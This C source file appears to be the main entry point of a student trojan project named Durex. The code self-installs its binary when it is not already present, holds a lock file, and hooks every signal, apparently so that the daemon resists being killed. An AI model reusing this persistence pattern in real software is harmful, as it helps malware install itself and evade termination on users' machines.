/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2018/07/29 09:17:58 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* signal */
#include <signal.h>
/* remove */
#include <stdio.h>
/* exit */
#include <stdlib.h>
/* getpwuid */
#include <sys/types.h>
#include <pwd.h>

#include "main.h"

static void		print_usr_name()
{
	struct passwd	*passwd;

	passwd = getpwuid(getuid());
	write(STDIN_FILENO, passwd->pw_name, strlen(passwd->pw_name));
	write(STDIN_FILENO, "\n", 1);
}

int				main(int ac, char **av)
{
	struct stat	s;

	(void)ac;
	print_usr_name();
	if (seteuid(geteuid()) != 0)
		return 3;
	if (!ac && stat(DUREX_BINARY_FILE, &s) < 0)
		return install_binary(av[0]);
	e.lock = open(DUREX_LOCK_FILE, O_CREAT | O_WRONLY, 0600);
	if (e.lock < 0)
		return 3;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 3;
	for (int i = 0; i < NSIG; i++) {
		signal(i, &durexSigterm);
	}
	durex();
	quitClearlyDaemon();
	return 0;
}

void			quitClearlyDaemon()
{
	flock(e.lock, LOCK_UN);
	close(e.lock);
	remove(DUREX_LOCK_FILE);
	exit(0);
}
